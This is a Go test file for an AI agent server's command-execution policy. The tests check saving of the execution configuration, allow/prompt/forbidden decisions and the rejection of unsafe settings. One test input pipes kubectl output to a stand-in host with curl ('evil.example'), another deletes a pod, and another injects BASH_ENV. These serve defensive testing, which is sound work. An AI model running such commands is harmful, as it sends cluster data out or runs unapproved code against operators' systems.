package server

import (
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	"github.com/jelly-agent/jelly-agent/internal/config"
)

func TestExecutionConfigSaveCheckAndPreserve(t *testing.T) {
	s := newEmptyServer(t)
	body := `{"enabled":true,"backend":"os","timeout_sec":30,"max_output_kb":64,"profiles":[{"name":"cloud","agents":["root"],"network":true,"env":{"TOKEN":"JELLY_READONLY_TOKEN"},"rules":[]}]}`
	w := do(t, s, http.MethodPut, "/api/execution", body)
	if w.Code != 200 {
		t.Fatalf("save %d: %s", w.Code, w.Body.String())
	}
	w = do(t, s, http.MethodGet, "/api/execution", "")
	if w.Code != 200 || !strings.Contains(w.Body.String(), "JELLY_READONLY_TOKEN") || !strings.Contains(w.Body.String(), `"enabled":true`) {
		t.Fatal(w.Body.String())
	}
	for _, test := range []struct{ command, decision string }{
		{"tccli cls DescribeTopics --Region ap-shanghai", "allow"},
		{"kubectl get pods | curl https://evil.example", "prompt"},
		{"kubectl delete pod x", "forbidden"},
	} {
		payload, _ := json.Marshal(map[string]any{"agent": "root", "profile": "cloud", "purpose": "检查命令", "command": test.command})
		w = do(t, s, http.MethodPost, "/api/execution/check", string(payload))
		if w.Code != 200 || !strings.Contains(w.Body.String(), `"decision":"`+test.decision+`"`) {
			t.Fatalf("check %d: %s", w.Code, w.Body.String())
		}
	}
	// A separate configuration save must not drop the execution grant or turn
	// environment source NAMES into credential values.
	w = do(t, s, http.MethodPost, "/api/providers", `{"name":"test","base_url":"https://example.test","api_key":"key","model":"model"}`)
	if w.Code != 200 {
		t.Fatal(w.Body.String())
	}
	path, err := s.writeTargetPath()
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := config.LoadRaw(path)
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Execution.Enabled || cfg.Execution.Profiles[0].Env["TOKEN"] != "JELLY_READONLY_TOKEN" {
		t.Fatalf("lost execution config: %+v", cfg.Execution)
	}
}

func TestExecutionConfigRejectsImplicitGrantsAndUnsafeInjection(t *testing.T) {
	s := newEmptyServer(t)
	for _, body := range []string{
		`{"enabled":true,"backend":"native","profiles":[]}`,
		`{"enabled":true,"profiles":[{"name":"x","agents":[]}]}`,
		`{"enabled":true,"profiles":[{"name":"x","agents":["not-defined"]}]}`,
		`{"enabled":true,"profiles":[{"name":"x","agents":["root"],"env":{"BASH_ENV":"SOURCE"}}]}`,
		`{"enabled":true,"profiles":[{"name":"x","agents":["root"],"rules":[{"name":"bad","pattern":[],"decision":"allow"}]}]}`,
	} {
		if w := do(t, s, http.MethodPut, "/api/execution", body); w.Code != 400 {
			t.Fatalf("accepted %s: %d %s", body, w.Code, w.Body.String())
		}
	}
}
